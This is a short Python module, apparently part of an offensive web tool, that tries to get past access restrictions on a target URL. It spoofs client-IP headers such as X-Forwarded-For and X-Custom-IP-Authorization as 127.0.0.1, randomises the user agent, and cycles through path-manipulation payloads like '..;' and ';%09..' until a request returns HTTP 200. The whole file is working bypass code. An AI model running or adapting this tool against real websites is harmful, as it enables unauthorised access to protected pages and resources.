import requests
from rich.console import Console
from modules.user_agent import user_agent

console = Console()

headers = {
            "Client-IP": "127.0.0.1",
            "X-Real-Ip": "127.0.0.1",
            "Redirect": "127.0.0.1",
            "Referer": "127.0.0.1",
            "X-Client-IP": "127.0.0.1",
            "X-Custom-IP-Authorization": "127.0.0.1",
            "X-Forwarded-By": "127.0.0.1",
            "X-Forwarded-For": "127.0.0.1",
            "X-Forwarded-Host": "127.0.0.1",
            "X-Forwarded-Port": "80",
            "X-True-IP": "127.0.0.1",
            "user-agent": user_agent.random_user_agent()
}

payloads = ["%09",
            "%20",
            "%23",
            "%2e",
            "%2f",
            ".",
            ";",
            "..;",
            ";%09",
            ";%09..",
            ";%09..;",
            ";%2f..",
            "*"]


def create_session(URL=None):
    session = requests.Session()
    session.headers.update(headers)
    # Create Bypasser
    for q in payloads:
        req = session.get(f"{URL}/{q}")
        
        if req.status_code == 200:
            return session